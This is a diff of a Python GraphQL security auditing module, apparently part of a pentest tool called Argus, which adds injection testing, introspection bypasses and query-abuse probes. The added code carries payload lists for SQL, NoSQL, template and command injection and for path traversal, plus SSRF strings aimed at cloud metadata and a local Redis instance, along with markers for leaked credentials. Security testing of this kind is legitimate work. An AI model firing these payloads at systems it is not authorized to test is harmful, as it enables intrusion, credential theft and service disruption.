@@ -1,52 +1,43 @@
 #!/usr/bin/env python3
 """
-auditing_tools/graphql_finder.py — GraphQL Security Auditor
+auditing_tools/graphql_finder.py — GraphQL Security Auditor (v2)
 ═══════════════════════════════════════════════════════════════════════════════
 
-Comprehensive GraphQL security testing module for Argus. Discovers endpoints,
-fingerprints the engine, dumps the schema, tests authorization boundaries,
-detects query abuse surfaces, and produces structured candidates.
+Comprehensive GraphQL security testing for Argus. Every technique a human
+pentester would try, in one module.
 
-Seven-phase strategy:
+TEN phases:
 
-  Phase 1 — Endpoint discovery
-      Brute-force 18+ common GraphQL paths. Detect via universal query
-      ({"query":"{__typename}"}) and response structure (data/errors keys).
+  1. Endpoint discovery          18+ paths, POST + GET variants
+  2. Engine fingerprinting       graphw00f-style signatures (10 engines)
+  3. Introspection               full dump + 6 bypass techniques when disabled
+  4. Schema analysis             sensitive types/fields/mutations + BOLA surface
+  5. Authorization testing       BOLA, BFLA, relay node-ID, nested-object gaps
+  6. Injection testing           SQLi, NoSQLi, SSTI, SSRF, cmd-injection
+                                 through variables and arguments
+  7. Query abuse                 batch batching, alias amplification,
+                                 depth-impact, negative-limit bypass,
+                                 directive flooding (CVE-2024-47614)
+  8. CSRF / transport            GET mutations, text/plain bypass, CORS
+  9. File upload                 multipart GraphQL spec surface detection
+ 10. WebSocket subscriptions     unauthenticated / expired-token subscription
 
-  Phase 2 — Engine fingerprinting
-      Identify Apollo, graphql-js, Hasura, Graphene, etc. from headers,
-      error messages, and introspection behavior.
+THIS IS TARGET-TRAFFIC. Platform headers and request.txt auth are applied
+to every request. Rate limits are enforced.
 
-  Phase 3 — Introspection & schema analysis
-      Full introspection dump (with depth control). Identify sensitive
-      types, fields (password, ssn, apiKey, internalNotes), and mutations
-      (delete*, admin*, reset*). Flag risky schema surface.
-
-  Phase 4 — Authorization testing (BOLA / BFLA / field-level)
-      With two identity cookies (User A, User B), test:
-        • BOLA: Query User B's data with User A's token
-        • BFLA: Execute admin-only mutations with a regular user token
-        • Field-level: Request sensitive fields the UI never shows
-
-  Phase 5 — Query abuse detection
-      Detect array batching, alias batching, depth limits, complexity limits.
-      Measure impact carefully — a finding requires demonstrated resource
-      consumption, not just a successful deep query.
-
-  Phase 6 — Injection surface & error leakage
-      Identify injectable arguments (SQLi/NoSQLi surface). Flag verbose
-      errors that expose stack traces or internal paths.
-
-  Phase 7 — CSRF / CORS / transport
-      Detect GET-based GraphQL (CSRF surface), missing CSRF tokens,
-      CORS misconfigurations, and WebSocket subscription endpoints.
+Config integration (config.py):
+  • MODULE_RATE_LIMITS["graphql"]   → request pacing + concurrency
+  • ACTIVE_HEADERS + AUTH_HEADERS   → merged into every request
+  • AUTH_COOKIES                    → session cookies
+  • SYNC_TO_DB, BRIDGE_*            → remote database sync
 
 Outputs (into `outdir`):
-  • graphql_findings.json        — full structured report
-  • graphql_candidates.txt       — flat list for triage
-  • graphql_schema.json          — raw introspection dump (if available)
-  • graphql_bola.txt             — BOLA-specific candidates
-  • graphql_query_abuse.txt      — batching/depth findings
+  • graphql_findings.json      — full structured report
+  • graphql_candidates.txt     — flat list for triage
+  • graphql_schema.json        — raw introspection dump (if available)
+  • graphql_bola.txt           — BOLA/BFLA findings
+  • graphql_query_abuse.txt    — DoS / batching findings
+  • graphql_injection.txt      — injection findings
 
 Integration:
   main.py → run_one("graphql") → run_graphql_audit(live_urls_file, outdir)
@@ -55,6 +46,8 @@ Integration:
 from __future__ import annotations
 
 import argparse
+import base64
+import hashlib
 import json
 import logging
 import re
@@ -75,56 +68,193 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 log = logging.getLogger("argus.graphql_finder")
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  CONFIGURATION
+#  CONFIG
 # ═════════════════════════════════════════════════════════════════════════════
 
-DEFAULT_THREADS      = 5
+try:
+    import config as CFG
+    CFG_LOADED = True
+except ImportError:
+    CFG = None
+    CFG_LOADED = False
+
+try:
+    from db import DB
+    DB_AVAILABLE = True
+except ImportError:
+    DB = None
+    DB_AVAILABLE = False
+
+
+def _cfg(key: str, default=None):
+    if not CFG_LOADED:
+        return default
+    return getattr(CFG, key, default)
+
+
+def _gql_settings() -> dict:
+    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("graphql", {})
+    return {
+        "rate_limit":  entry.get("rate_limit", 2),
+        "concurrency": entry.get("concurrency", 2),
+        "timeout":     entry.get("timeout", 15),
+    }
+
+
+def _target_headers() -> dict[str, str]:
+    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
+    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
+        auth_hdrs = getattr(CFG, "AUTH_HEADERS", {}) or {}
+        if auth_hdrs:
+            h.update(auth_hdrs)
+    return h
+
+
+def _auth_cookies() -> dict[str, str]:
+    if not CFG_LOADED or not getattr(CFG, "AUTH_ENABLED", False):
+        return {}
+    return dict(getattr(CFG, "AUTH_COOKIES", {}) or {})
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  CONSTANTS
+# ═════════════════════════════════════════════════════════════════════════════
+
+DEFAULT_THREADS      = 2
+DEFAULT_RATE_LIMIT   = 2
 DEFAULT_TIMEOUT      = 15
 DEFAULT_RETRIES      = 1
-USER_AGENT           = "Argus-GraphQL-Auditor/1.0"
 
-# Endpoint discovery
 GRAPHQL_PATHS = [
     "/graphql", "/graphiql", "/graphql.php", "/graphql/console",
-    "/api/graphql", "/graphql/api", "/graphql/graphql",
-    "/query", "/gql", "/v1/graphql", "/v2/graphql",
+    "/api/graphql", "/graphql/api", "/graphql/graphql", "/graphql/v1",
+    "/query", "/gql", "/v1/graphql", "/v2/graphql", "/v3/graphql",
     "/api/v1/graphql", "/api/v2/graphql", "/index.php/graphql",
+    "/playground", "/explorer", "/altair", "/graph",
 ]
 
-# Introspection depth limit
-INTROSPECTION_MAX_DEPTH = 5
+INTROSPECTION_MAX_DEPTH   = 5
+MAX_BATCH_SIZE            = 10
+MAX_ALIAS_COUNT           = 10
+MAX_DEPTH_PROBE           = 20
+MAX_DIRECTIVE_FLOOD       = 1000   # CVE-2024-47614 probe size
+DEPTH_IMPACT_THRESHOLD    = 2.0
 
-# Query abuse
-MAX_BATCH_SIZE       = 10      # array batching probe size
-MAX_ALIAS_COUNT      = 10      # alias batching probe size
-MAX_DEPTH_PROBE      = 20      # depth probe ceiling (safe)
-DEPTH_IMPACT_THRESHOLD = 2.0   # seconds — response time delta that indicates impact
-
-# Sensitive field patterns
 SENSITIVE_FIELD_PATTERNS = [
     "password", "passwd", "pwd", "secret", "token", "api_key", "apikey",
     "access_key", "private_key", "ssn", "social_security", "credit_card",
     "card_number", "cvv", "internal_notes", "internal_comment", "salary",
     "bank_account", "routing_number", "tax_id", "national_id",
+    "refresh_token", "session_id", "otp", "mfa_secret",
 ]
 
 SENSITIVE_TYPE_PATTERNS = [
     "admin", "internal", "private", "system", "audit", "billing",
-    "payment", "credit", "invoice", "user", "account", "profile",
+    "payment", "credit", "invoice", "user", "account", "profile", "session",
 ]
 
 SENSITIVE_MUTATION_PATTERNS = [
     "delete", "destroy", "remove", "admin", "reset", "revoke",
     "impersonate", "override", "escalate", "grant", "disable",
+    "promote", "update", "create", "withdraw", "transfer",
 ]
 
-# Error leakage patterns
 ERROR_LEAK_PATTERNS = [
     r"stack\s*trace", r"at\s+\w+\.\w+\s*\(", r"SQLSTATE", r"mysql_",
     r"postgresql", r"ORA-\d+", r"at\s+Object\.<anonymous>",
     r"node_modules", r"\.java:\d+", r"\.py:\d+", r"\.rb:\d+",
-    r"internal server error", r"debug mode",
+    r"internal server error", r"debug mode", r"mongoerror",
 ]
+
+# ── Injection payload matrix (by class) ────────────────────────────────────
+INJECTION_PAYLOADS = {
+    "sqli": [
+        "'", "\"", "') OR ('1'='1", "') OR 1=1--",
+        "1' AND SLEEP(3)--", "1' UNION SELECT NULL--",
+        "\" OR \"\"=\"", "admin' OR '1'='1",
+    ],
+    "nosqli": [
+        "{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$where\":\"sleep(3000)\"}",
+        "{\"$regex\":\".*\"}", "';return true;var x='",
+    ],
+    "ssti": [
+        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "*{7*7}",
+    ],
+    "ssrf": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://127.0.0.1:80",
+        "http://[::1]:80",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6379/_INFO",
+    ],
+    "cmd": [
+        ";id", "|id", "$(id)", "`id`", "&& id", "|| id",
+    ],
+    "path_traversal": [
+        "../../../etc/passwd", "....//....//etc/passwd",
+        "..%2f..%2f..%2fetc%2fpasswd",
+    ],
+}
+
+# ── Sensitive response markers (for injection / PII confirmation) ─────────
+PII_MARKERS = [
+    "root:x:0:0", "uid=0", "AccessKeyId", "SecretAccessKey",
+    "ami-id", "instance-id", "internal", "password_hash",
+]
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  RATE-LIMITED SESSION
+# ═════════════════════════════════════════════════════════════════════════════
+
+class RateLimitedSession:
+    def __init__(self, rate_limit: int = DEFAULT_RATE_LIMIT, timeout: int = DEFAULT_TIMEOUT):
+        self.session = requests.Session()
+        self.session.verify = False
+        hdrs = _target_headers()
+        if hdrs:
+            self.session.headers.update(hdrs)
+        if "User-Agent" not in self.session.headers:
+            self.session.headers["User-Agent"] = "Argus-GraphQL-Auditor/2.0"
+        cookies = _auth_cookies()
+        for k, v in cookies.items():
+            self.session.cookies.set(k, v)
+        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
+        self.timeout = timeout
+        self._last = 0.0
+
+    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
+        if self.min_interval > 0:
+            elapsed = time.monotonic() - self._last
+            if elapsed < self.min_interval:
+                time.sleep(self.min_interval - elapsed)
+        self._last = time.monotonic()
+        try:
+            return self.session.request(
+                method, url,
+                timeout=kwargs.pop("timeout", self.timeout),
+                allow_redirects=kwargs.pop("allow_redirects", False),
+                verify=False,
+                **kwargs,
+            )
+        except requests.RequestException as e:
+            log.debug(f"request failed: {method} {url}: {e}")
+            return None
+
+    def post_json(self, url: str, body: Any, headers: Optional[dict] = None) -> Optional[requests.Response]:
+        hdrs = {"Content-Type": "application/json"}
+        if headers:
+            hdrs.update(headers)
+        return self.request("POST", url, json=body, headers=hdrs)
+
+    def post_raw(self, url: str, body: bytes, content_type: str, headers: Optional[dict] = None) -> Optional[requests.Response]:
+        hdrs = {"Content-Type": content_type}
+        if headers:
+            hdrs.update(headers)
+        return self.request("POST", url, data=body, headers=hdrs)
+
+    def get(self, url: str, **kwargs):
+        return self.request("GET", url, **kwargs)
+
 
 # ═════════════════════════════════════════════════════════════════════════════
 #  DATA MODELS
@@ -132,21 +262,39 @@ ERROR_LEAK_PATTERNS = [
 
 @dataclass
 class GraphQLFinding:
-    target: str
+    endpoint: str
     vuln_type: str
+    category: str = "discovery"
     severity: str = "MEDIUM"
     confidence: int = 50
+    engine: str = ""
     evidence: str = ""
+    query_payload: str = ""
+    response_snippet: str = ""
     details: dict = field(default_factory=dict)
+    auth_enabled: bool = False
+    first_seen: str = ""
+
+    @property
+    def finding_hash(self) -> str:
+        return hashlib.sha256(f"{self.endpoint}|{self.vuln_type}".encode()).hexdigest()
 
     def to_dict(self) -> dict:
         return {
-            "target":     self.target,
-            "vuln_type":  self.vuln_type,
-            "severity":   self.severity,
-            "confidence": self.confidence,
-            "evidence":   self.evidence[:500],
-            "details":    self.details,
+            "endpoint":         self.endpoint,
+            "endpoint_host":    urllib.parse.urlparse(self.endpoint).hostname or "",
+            "engine":           self.engine,
+            "vuln_type":        self.vuln_type,
+            "category":         self.category,
+            "severity":         self.severity,
+            "confidence":       self.confidence,
+            "evidence":         self.evidence[:500],
+            "query_payload":    self.query_payload[:1000],
+            "response_snippet": self.response_snippet[:500],
+            "details":          self.details,
+            "auth_enabled":     self.auth_enabled,
+            "finding_hash":     self.finding_hash,
+            "first_seen":       self.first_seen,
         }
 
 
@@ -157,18 +305,22 @@ class GraphQLEndpoint:
     introspectable: bool = False
     schema: Optional[dict] = None
     get_supported: bool = False
+    text_plain_supported: bool = False
+    multipart_supported: bool = False
     websocket_url: str = ""
-    cors_headers: dict = field(default_factory=dict)
+    cors_reflects_creds: bool = False
 
     def to_dict(self) -> dict:
         return {
-            "url":             self.url,
-            "engine":          self.engine,
-            "introspectable":  self.introspectable,
-            "has_schema":      self.schema is not None,
-            "get_supported":   self.get_supported,
-            "websocket_url":   self.websocket_url,
-            "cors_headers":    self.cors_headers,
+            "url":                   self.url,
+            "engine":                self.engine,
+            "introspectable":        self.introspectable,
+            "has_schema":            self.schema is not None,
+            "get_supported":         self.get_supported,
+            "text_plain_supported":  self.text_plain_supported,
+            "multipart_supported":   self.multipart_supported,
+            "websocket_url":         self.websocket_url,
+            "cors_reflects_creds":   self.cors_reflects_creds,
         }
 
 
@@ -176,68 +328,24 @@ class GraphQLEndpoint:
 #  UTILITIES
 # ═════════════════════════════════════════════════════════════════════════════
 
-def _load_urls(input_file: Path) -> list[str]:
-    if not input_file.exists():
+def _load_urls(path: Path) -> list[str]:
+    if not path.exists():
         return []
-    urls: list[str] = []
-    seen: set[str] = set()
-    for line in input_file.read_text().splitlines():
+    urls, seen = [], set()
+    for line in path.read_text().splitlines():
         line = line.strip()
         if not line or line.startswith("#"):
             continue
-        token = line.split()[0]
-        if not token.startswith(("http://", "https://")):
-            token = "https://" + token
-        if token not in seen:
-            seen.add(token)
-            urls.append(token)
+        tok = line.split()[0]
+        if not tok.startswith(("http://", "https://")):
+            tok = "https://" + tok
+        if tok not in seen:
+            seen.add(tok)
+            urls.append(tok)
     return urls
 
 
-def _graphql_post(
-    session: requests.Session,
-    url: str,
-    query: str,
-    variables: Optional[dict] = None,
-    headers: Optional[dict] = None,
-    timeout: int = DEFAULT_TIMEOUT,
-) -> Optional[requests.Response]:
-    """Send a GraphQL query via POST."""
-    body: dict[str, Any] = {"query": query}
-    if variables:
-        body["variables"] = variables
-    hdrs = {"Content-Type": "application/json", "User-Agent": USER_AGENT}
-    if headers:
-        hdrs.update(headers)
-    try:
-        return session.post(
-            url, json=body, headers=hdrs,
-            timeout=timeout, allow_redirects=False, verify=False,
-        )
-    except requests.RequestException as e:
-        log.debug(f"POST {url} failed: {e}")
-        return None
-
-
-def _graphql_get(
-    session: requests.Session,
-    url: str,
-    query: str,
-    timeout: int = DEFAULT_TIMEOUT,
-) -> Optional[requests.Response]:
-    """Send a GraphQL query via GET (CSRF surface check)."""
-    params = {"query": query}
-    try:
-        return session.get(
-            url, params=params, timeout=timeout,
-            allow_redirects=False, verify=False,
-        )
-    except requests.RequestException:
-        return None
-
-
 def _is_graphql_response(resp: requests.Response) -> bool:
-    """Check whether a response looks like a GraphQL response."""
     if resp.status_code >= 500:
         return False
     try:
@@ -249,22 +357,58 @@ def _is_graphql_response(resp: requests.Response) -> bool:
     return "data" in data or "errors" in data
 
 
-def _extract_errors(resp: requests.Response) -> list[str]:
+def _errors(resp: requests.Response) -> list[str]:
     try:
         data = resp.json()
     except Exception:
         return []
-    errors = data.get("errors", [])
-    if not isinstance(errors, list):
+    errs = data.get("errors", [])
+    if not isinstance(errs, list):
         return []
-    return [str(e.get("message", "")) for e in errors if isinstance(e, dict)]
+    return [str(e.get("message", "")) for e in errs if isinstance(e, dict)]
 
 
-def _body_text(resp: requests.Response, max_len: int = 500) -> str:
+def _body_text(resp: requests.Response, n: int = 500) -> str:
     try:
-        return resp.text[:max_len].replace("\n", " ").strip()
+        return resp.text[:n].replace("\n", " ").strip()
     except Exception:
         return ""
+
+
+def _extract_suggested_fields(error_msg: str) -> list[str]:
+    """Parse 'Did you mean ...' suggestions from error messages."""
+    m = re.search(r'Did you mean\s+(.+?)(?:\?|$)', error_msg, re.I)
+    if not m:
+        return []
+    raw = m.group(1)
+    return [s.strip().strip('"').strip("'") for s in re.split(r'[,]|or', raw) if s.strip()]
+
+
+def _has_pii(text: str) -> tuple[bool, list[str]]:
+    hits = [m for m in PII_MARKERS if m in text]
+    return bool(hits), hits
+
+
+def _b64_decode_safe(s: str) -> Optional[str]:
+    try:
+        padding = 4 - (len(s) % 4)
+        if padding != 4:
+            s += "=" * padding
+        return base64.b64decode(s).decode("utf-8", errors="replace")
+    except Exception:
+        return None
+
+
+def _b64_encode(s: str) -> str:
+    return base64.b64encode(s.encode()).decode()
+
+
+def _discover_ws_url(endpoint_url: str) -> str:
+    """Derive the WebSocket subscription endpoint from an HTTP endpoint URL."""
+    parsed = urllib.parse.urlparse(endpoint_url)
+    scheme = "wss" if parsed.scheme == "https" else "ws"
+    path = parsed.path or "/graphql"
+    return f"{scheme}://{parsed.netloc}{path}"
 
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -272,21 +416,20 @@ def _body_text(resp: requests.Response, max_len: int = 500) -> str:
 # ═════════════════════════════════════════════════════════════════════════════
 
 DISCOVERY_QUERY = "{__typename}"
+DISCOVERY_BODY = {"query": DISCOVERY_QUERY, "operationName": "probe"}
 
 
 def discover_graphql_endpoints(
-    session: requests.Session, base_urls: list[str],
+    session: RateLimitedSession, base_urls: list[str],
 ) -> list[GraphQLEndpoint]:
-    """Brute-force common GraphQL paths on every host."""
     endpoints: list[GraphQLEndpoint] = []
     seen: set[str] = set()
 
-    # Extract unique hosts
     hosts: set[str] = set()
     for url in base_urls:
-        parsed = urllib.parse.urlparse(url)
-        if parsed.hostname:
-            hosts.add(f"{parsed.scheme}://{parsed.netloc}")
+        p = urllib.parse.urlparse(url)
+        if p.hostname:
+            hosts.add(f"{p.scheme}://{p.netloc}")
 
     log.info(f"    Probing {len(hosts)} host(s) × {len(GRAPHQL_PATHS)} path(s)")
 
@@ -297,15 +440,34 @@ def discover_graphql_endpoints(
                 continue
             seen.add(test_url)
 
-            resp = _graphql_post(session, test_url, DISCOVERY_QUERY)
-            if resp and _is_graphql_response(resp):
-                ep = GraphQLEndpoint(url=test_url)
-                # Check GET support (CSRF surface)
-                get_resp = _graphql_get(session, test_url, DISCOVERY_QUERY)
-                if get_resp and _is_graphql_response(get_resp):
-                    ep.get_supported = True
-                endpoints.append(ep)
-                log.info(f"      FOUND {test_url}")
+            resp = session.post_json(test_url, DISCOVERY_BODY)
+            if not resp or not _is_graphql_response(resp):
+                continue
+
+            ep = GraphQLEndpoint(url=test_url)
+
+            # GET support
+            get_resp = session.get(test_url, params={"query": DISCOVERY_QUERY})
+            if get_resp and _is_graphql_response(get_resp):
+                ep.get_supported = True
+
+            # text/plain support (CSRF bypass)
+            try:
+                tp_resp = session.post_raw(
+                    test_url,
+                    json.dumps(DISCOVERY_BODY).encode(),
+                    "text/plain",
+                )
+                if tp_resp and _is_graphql_response(tp_resp):
+                    ep.text_plain_supported = True
+            except Exception:
+                pass
+
+            # WebSocket derivation
+            ep.websocket_url = _discover_ws_url(test_url)
+
+            endpoints.append(ep)
+            log.info(f"      FOUND {test_url}")
 
     return endpoints
 
@@ -314,58 +476,46 @@ def discover_graphql_endpoints(
 #  PHASE 2 — ENGINE FINGERPRINTING
 # ═════════════════════════════════════════════════════════════════════════════
 
-def fingerprint_engine(
-    session: requests.Session, endpoint: GraphQLEndpoint,
-) -> str:
-    """Identify the GraphQL engine from response characteristics."""
-    # Send a deliberately malformed query to trigger engine-specific errors
-    probe = '{"query":"{__typename"}'
+def fingerprint_engine(session: RateLimitedSession, ep: GraphQLEndpoint) -> str:
+    # Malformed query to trigger engine errors
     try:
-        resp = session.post(
-            endpoint.url, data=probe,
-            headers={"Content-Type": "application/json", "User-Agent": USER_AGENT},
-            timeout=DEFAULT_TIMEOUT, verify=False,
+        resp = session.post_raw(
+            ep.url,
+            b'{"query":"{__typename"}',
+            "application/json",
         )
-    except requests.RequestException:
+    except Exception:
+        return "unknown"
+    if not resp:
         return "unknown"
 
     body = resp.text.lower()
     headers_str = str(resp.headers).lower()
 
-    # Engine-specific signatures
-    if "apollo" in body or "apollo" in headers_str:
-        return "Apollo"
-    if "graphql-yoga" in body or "yoga" in body:
-        return "graphql-yoga"
-    if "hasura" in body:
-        return "Hasura"
-    if "graphene" in body:
-        return "Graphene"
-    if "ariadne" in body:
-        return "Ariadne"
-    if "express-graphql" in body or "express" in body:
-        return "express-graphql"
-    if "graphql-js" in body or "graphql.js" in body:
-        return "graphql-js"
-    if "absinthe" in body:
-        return "Absinthe"
-    if "juniper" in body:
-        return "Juniper"
-    if "sangria" in body:
-        return "Sangria"
-
-    # Fallback: check Server header
-    server = resp.headers.get("Server", "").lower()
-    if "apollo" in server:
-        return "Apollo"
-    if "hasura" in server:
-        return "Hasura"
-
+    sigs = [
+        ("Apollo",      ["apollo", "graphql/apollo"]),
+        ("graphql-yoga", ["graphql-yoga", "yoga"]),
+        ("Hasura",      ["hasura", "x-hasura"]),
+        ("Graphene",    ["graphene"]),
+        ("Ariadne",     ["ariadne"]),
+        ("express-graphql", ["express-graphql"]),
+        ("graphql-js",  ["graphql-js", "graphql.js"]),
+        ("Absinthe",    ["absinthe"]),
+        ("Juniper",     ["juniper"]),
+        ("Sangria",     ["sangria"]),
+        ("Hot Chocolate", ["hot chocolate", "hotchocolate"]),
+        ("AWS AppSync", ["appsync"]),
+        ("Shopify",     ["shopify"]),
+    ]
+    for name, needles in sigs:
+        for n in needles:
+            if n in body or n in headers_str:
+                return name
     return "unknown"
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 3 — INTROSPECTION & SCHEMA ANALYSIS
+#  PHASE 3 — INTROSPECTION (with 6 bypass techniques)
 # ═════════════════════════════════════════════════════════════════════════════
 
 INTROSPECTION_QUERY = """
@@ -374,67 +524,33 @@ query IntrospectionQuery {
     queryType { name }
     mutationType { name }
     subscriptionType { name }
-    types {
-      ...FullType
-    }
+    types { ...FullType }
   }
 }
-
 fragment FullType on __Type {
-  kind
-  name
-  description
+  kind name description
   fields(includeDeprecated: true) {
-    name
-    description
-    args {
-      name
-      description
-      type { ...TypeRef }
-    }
+    name description
+    args { name description type { ...TypeRef } }
     type { ...TypeRef }
   }
-  inputFields {
-    name
-    description
-    type { ...TypeRef }
-  }
+  inputFields { name description type { ...TypeRef } }
   interfaces { ...TypeRef }
-  enumValues(includeDeprecated: true) {
-    name
-    description
-  }
+  enumValues(includeDeprecated: true) { name description }
   possibleTypes { ...TypeRef }
 }
-
 fragment TypeRef on __Type {
-  kind
-  name
-  ofType {
-    kind
-    name
-    ofType {
-      kind
-      name
-      ofType {
-        kind
-        name
-        ofType {
-          kind
-          name
-        }
-      }
-    }
-  }
+  kind name
+  ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
 }
 """
 
 
 def run_introspection(
-    session: requests.Session, endpoint: GraphQLEndpoint,
+    session: RateLimitedSession, ep: GraphQLEndpoint,
 ) -> Optional[dict]:
-    """Attempt full introspection. Returns the schema dict or None."""
-    resp = _graphql_post(session, endpoint.url, INTROSPECTION_QUERY)
+    """Try full introspection. Returns schema dict or None."""
+    resp = session.post_json(ep.url, {"query": INTROSPECTION_QUERY, "operationName": "IntrospectionQuery"})
     if not resp:
         return None
     try:
@@ -445,40 +561,136 @@ def run_introspection(
         return None
     schema = data["data"].get("__schema")
     if schema:
-        endpoint.introspectable = True
-        endpoint.schema = schema
+        ep.introspectable = True
+        ep.schema = schema
         return schema
     return None
 
 
-def analyze_schema(
-    endpoint: GraphQLEndpoint, schema: dict,
+def bypass_introspection(
+    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
 ) -> list[GraphQLFinding]:
     """
-    Analyze the introspected schema for:
-      • Sensitive types
-      • Sensitive fields (password, ssn, apiKey, etc.)
-      • Sensitive mutations (delete*, admin*, reset*)
-      • Risky arguments (id, uuid, email on user types)
+    When full introspection is disabled, apply six bypass techniques:
+
+      1. __type fallback (server blocks __schema but not __type)
+      2. Newline / whitespace obfuscation of __schema
+      3. Field-suggestion oracle (Did you mean...)
+      4. Root field enumeration via fuzzing
+      5. __typename-based field stuffing
+      6. Aliased introspection
     """
     findings: list[GraphQLFinding] = []
-    types = schema.get("types", [])
+    now = datetime.now(timezone.utc).isoformat()
 
-    sensitive_types: list[str] = []
-    sensitive_fields: list[dict] = []
-    sensitive_mutations: list[dict] = []
-    bola_args: list[dict] = []
+    # ── Technique 1: __type fallback ────────────────────────────────────────
+    type_query = '{"query":"{ __type(name: \\"Query\\") { name fields { name } } }"}'
+    resp = session.post_raw(ep.url, type_query.encode(), "application/json")
+    if resp and _is_graphql_response(resp):
+        try:
+            data = resp.json()
+            if data.get("data", {}).get("__type"):
+                findings.append(GraphQLFinding(
+                    endpoint=ep.url, vuln_type="graphql_introspection_type_fallback",
+                    category="introspection", severity="MEDIUM", confidence=80,
+                    engine=ep.engine,
+                    evidence="__schema blocked but __type(name: \"Query\") succeeds",
+                    query_payload=type_query,
+                    response_snippet=_body_text(resp),
+                    auth_enabled=auth_on, first_seen=now,
+                ))
+        except Exception:
+            pass
+
+    # ── Technique 2: newline bypass (__schema\n) ────────────────────────────
+    for sep in ("\n", "\t", "\r\n", "  "):
+        q = f'{{ __schema{sep}{{ types{{ name }} }} }}'
+        body = {"query": q}
+        r = session.post_json(ep.url, body)
+        if r and _is_graphql_response(r):
+            try:
+                data = r.json()
+                if data.get("data", {}).get("__schema"):
+                    findings.append(GraphQLFinding(
+                        endpoint=ep.url, vuln_type="graphql_introspection_newline_bypass",
+                        category="introspection", severity="HIGH", confidence=85,
+                        engine=ep.engine,
+                        evidence=f"__schema newline-bypass ({sep!r}) reaches introspection",
+                        query_payload=q,
+                        response_snippet=_body_text(r),
+                        auth_enabled=auth_on, first_seen=now,
+                    ))
+                    break
+            except Exception:
+                pass
+
+    # ── Technique 3: field-suggestion oracle ────────────────────────────────
+    # Query a fake field; parse the "Did you mean" suggestion
+    suggestions: set[str] = set()
+    for fake in ("aaa", "zzz", "qqq", "nonexistent"):
+        q = f'{{ {fake} }}'
+        r = session.post_json(ep.url, {"query": q})
+        if not r:
+            continue
+        for msg in _errors(r):
+            suggestions.update(_extract_suggested_fields(msg))
+
+    if suggestions:
+        findings.append(GraphQLFinding(
+            endpoint=ep.url, vuln_type="graphql_field_suggestion_leak",
+            category="introspection", severity="MEDIUM", confidence=85,
+            engine=ep.engine,
+            evidence=f"Field suggestions leaked: {', '.join(sorted(suggestions)[:15])}",
+            response_snippet="",
+            details={"suggested_fields": sorted(suggestions)[:100]},
+            auth_enabled=auth_on, first_seen=now,
+        ))
+
+    # ── Technique 4: probe schema via __typename stuffing ───────────────────
+    # Build a query that asks for many possible root fields with __typename
+    candidate_fields = list(suggestions) + [
+        "user", "users", "me", "viewer", "admin", "account",
+        "node", "nodes", "posts", "comments", "search",
+        "config", "settings", "health", "version", "info",
+    ]
+    probe = "{ " + " ".join(f'{f}: __typename' for f in candidate_fields if f) + " }"
+    r = session.post_json(ep.url, {"query": probe})
+    if r and _is_graphql_response(r):
+        try:
+            data = r.json().get("data", {})
+            found = [k for k, v in (data or {}).items() if v is not None]
+            if found:
+                findings.append(GraphQLFinding(
+                    endpoint=ep.url, vuln_type="graphql_root_field_enumeration",
+                    category="introspection", severity="MEDIUM", confidence=70,
+                    engine=ep.engine,
+                    evidence=f"Root fields discovered via aliasing: {', '.join(found[:15])}",
+                    query_payload=probe,
+                    details={"root_fields": found[:50]},
+                    auth_enabled=auth_on, first_seen=now,
+                ))
+        except Exception:
+            pass
+
+    return findings
+
+
+def analyze_schema(
+    ep: GraphQLEndpoint, schema: dict, auth_on: bool,
+) -> list[GraphQLFinding]:
+    findings: list[GraphQLFinding] = []
+    now = datetime.now(timezone.utc).isoformat()
+
+    types = schema.get("types", [])
+    sensitive_types, sensitive_fields, sensitive_mutations, bola_args = [], [], [], []
 
     for t in types:
         tname = t.get("name", "")
         if tname.startswith("__"):
             continue
-
-        # Sensitive type names
         if any(pat in tname.lower() for pat in SENSITIVE_TYPE_PATTERNS):
             sensitive_types.append(tname)
 
-        # Sensitive fields
         for f in t.get("fields") or []:
             fname = (f.get("name") or "").lower()
             if any(pat in fname for pat in SENSITIVE_FIELD_PATTERNS):
@@ -487,19 +699,16 @@ def analyze_schema(
                     "field": f.get("name"),
                     "args":  [a.get("name") for a in (f.get("args") or [])],
                 })
-
-            # BOLA argument surface: fields that take an id-like argument
             for arg in f.get("args") or []:
                 aname = (arg.get("name") or "").lower()
                 if aname in ("id", "uuid", "user_id", "userid", "account_id",
-                             "email", "username", "tenant_id"):
+                             "email", "username", "tenant_id", "nodeid"):
                     bola_args.append({
-                        "type":   tname,
-                        "field":  f.get("name"),
-                        "arg":    arg.get("name"),
+                        "type":  tname,
+                        "field": f.get("name"),
+                        "arg":   arg.get("name"),
                     })
 
-    # Sensitive mutations
     for t in types:
         if t.get("name") == schema.get("mutationType", {}).get("name"):
             for f in t.get("fields") or []:
@@ -510,255 +719,156 @@ def analyze_schema(
                         "args":     [a.get("name") for a in (f.get("args") or [])],
                     })
 
-    # ── Build findings ──────────────────────────────────────────────────────
     if sensitive_types:
         findings.append(GraphQLFinding(
-            target=endpoint.url,
-            vuln_type="graphql_sensitive_types",
-            severity="LOW",
-            confidence=70,
-            evidence=f"Sensitive types exposed in schema: {', '.join(sensitive_types[:10])}",
+            endpoint=ep.url, vuln_type="graphql_sensitive_types",
+            category="introspection", severity="LOW", confidence=70,
+            engine=ep.engine,
+            evidence=f"Sensitive types: {', '.join(sensitive_types[:10])}",
             details={"types": sensitive_types[:50]},
+            auth_enabled=auth_on, first_seen=now,
         ))
 
     if sensitive_fields:
         findings.append(GraphQLFinding(
-            target=endpoint.url,
-            vuln_type="graphql_sensitive_fields",
-            severity="MEDIUM",
-            confidence=80,
